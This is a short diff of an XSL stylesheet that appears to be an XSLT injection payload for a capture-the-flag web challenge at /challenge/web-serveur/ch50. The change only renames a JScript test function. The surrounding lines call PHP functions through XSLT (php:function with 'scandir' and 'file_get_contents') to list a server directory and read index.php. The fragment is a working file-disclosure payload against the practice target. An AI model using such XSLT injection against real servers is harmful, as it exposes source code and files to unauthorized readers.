@@ -7,12 +7,12 @@ xmlns:user="http://mycompany.com/mynamespace"
 >	
 <msxsl:script language="JScript" implements-prefix="user">
 <![CDATA[
-function test(){return "hello world!";}
+function test1(){return "hello world!";}
 ]]>
 </msxsl:script>
 <xsl:template match="/">	
 <xsl:param  name="shandle"    select="php:function('scandir','/challenge/web-serveur/ch50')" disable-output-escaping="yes"/>
-<xsl:param  name="strscand"   select="user:test()" disable-output-escaping="yes"/> 
+<xsl:param  name="strscand"   select="user:test1()" disable-output-escaping="yes"/> 
 <xsl:param  name="header"     select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')" disable-output-escaping="yes"/>
 <div style="background-color:teal;color:white;padding:4px">
 <span style="font-weight:bold">
